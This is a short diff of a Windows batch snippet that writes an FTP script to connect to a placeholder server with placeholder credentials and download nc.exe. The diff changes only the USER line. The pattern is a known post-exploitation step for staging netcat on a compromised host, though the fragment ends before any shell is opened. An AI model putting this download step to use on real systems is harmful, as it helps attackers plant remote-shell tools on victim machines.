@@ -1,5 +1,5 @@
 echo open *FTP server IP Address* *PORT*> ftp.txt
-echo USER *USER*>> ftp.txt
+echo *USER*>> ftp.txt
 echo *PASSWORD*>> ftp.txt
 echo bin>> ftp.txt
 echo GET nc.exe >> ftp.txt
